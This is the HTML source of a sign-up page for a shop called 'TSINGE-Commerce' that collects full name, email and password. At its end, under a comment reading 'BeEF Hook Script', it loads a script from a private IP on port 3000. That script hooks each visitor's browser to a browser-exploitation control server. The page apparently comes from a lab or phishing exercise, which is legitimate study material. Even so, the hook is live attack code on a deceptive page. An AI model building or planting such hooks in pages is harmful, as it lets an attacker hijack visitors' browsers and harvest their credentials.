<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSINGE-Commerce</title>
    <style>
        /* Cyberpunk Theme */
        body {
            background-color: #000814;
            color: #0ef;
            font-family: 'Arial', sans-serif;
            text-align: center;
        }
        h1 {
            color: #ff007f;
        }
        .container {
            width: 90%;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #0ef;
            border-radius: 10px;
            box-shadow: 0px 0px 15px #0ef;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #ff007f;
            background: black;
            color: #0ef;
            font-size: 16px;
            border-radius: 5px;
        }
        button {
            background: #ff007f;
            color: white;
            border: none;
            padding: 10px 15px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background: #0ef;
            color: black;
        }
    </style>
</head>
<body>

    <h1>TSINGE-Commerce</h1>
    
    <div class="container">
        <h2>Sign Up</h2>
        <form action="#" method="post">
            <input type="text" name="full_name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Create Password" required>
            <button type="submit">Sign Up</button>
        </form>
    </div>

    <!-- BeEF Hook Script -->
    <script src="http://192.168.73.128:3000/hook.js"></script>

</body>
</html>
